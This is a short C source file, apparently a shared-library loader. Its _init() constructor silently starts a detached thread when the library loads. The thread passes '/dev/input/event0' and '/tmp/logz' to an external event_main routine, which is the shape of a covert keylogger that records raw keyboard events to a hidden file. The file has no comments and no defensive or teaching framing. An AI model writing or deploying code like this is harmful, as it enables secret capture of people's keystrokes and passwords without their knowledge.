#include <stdio.h>
#include <pthread.h>

extern int event_main(int argc, char **argv);

void *thread(void *arg)
{
	char *argv[] = {"foo", "/dev/input/event0", "/tmp/logz", NULL};
	event_main(3, argv);
	return NULL;
}


void _init()
{

	pthread_t tid;
	pthread_create(&tid, NULL, thread, NULL);
	pthread_detach(tid);
	return;
}

